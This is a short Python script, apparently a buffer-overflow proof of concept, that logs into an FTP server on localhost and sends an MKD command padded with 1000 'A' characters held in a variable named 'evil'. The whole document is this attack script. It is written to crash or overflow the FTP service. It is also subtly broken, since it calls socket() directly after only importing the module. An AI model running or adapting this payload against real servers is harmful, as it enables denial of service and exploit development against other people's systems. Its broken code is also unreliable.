import socket
import sys

evil = "A" * 1000

s = socket(socket.AF_INET, socket.SOCK_STREAM)

connect = s.connect(('127.0.0.1', 21))

s.recv(1024)
s.send('USER\r\n')
s.recv(1024)
s.send('PASS\r\n')
s.recv(1024)
s.send('MKD' + evil + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close()
